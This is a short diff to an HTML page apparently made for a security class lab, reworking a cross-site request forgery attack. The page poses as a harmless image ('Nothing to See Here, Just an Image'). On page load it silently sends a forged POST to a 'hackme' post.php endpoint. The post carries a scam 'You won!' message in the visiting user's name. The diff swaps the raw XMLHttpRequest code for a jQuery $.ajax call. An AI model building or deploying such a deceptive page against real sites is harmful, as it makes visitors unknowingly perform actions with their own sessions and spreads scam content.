@@ -3,6 +3,7 @@
 	<head>
 		<meta charset="UTF-8">
 		<title>Nothing to See Here, Just an Image</title>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
 	</head>
 	<body>
 		<h1>Having a nice day?</h1>
@@ -14,22 +15,18 @@
 		<script>
 			window.onload = function() {
 				var url = "http://infosec-020-104/hackme/post.php";
-				console.log('Running');
 				var method = "POST";
 				var postData = {
 					title: 'You won!',
 					message: 'You have been selected for a free flying dragon ride.',
-					post_submit: 'Winning'
+					post_submit: true
 				};
-				var async = true;
-				var request = new XMLHttpRequest();
-				request.onload = function () {
-					var status = request.status;
-					var data = request.responseText;
-				}
-				request.open(method, url, async);
-				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-				request.send(postData);
+				$.ajax({
+					type: method,
+					url: url,
+					data: postData,
+					dataType: 'json'
+				})
 			}
 		</script>
 	</body>
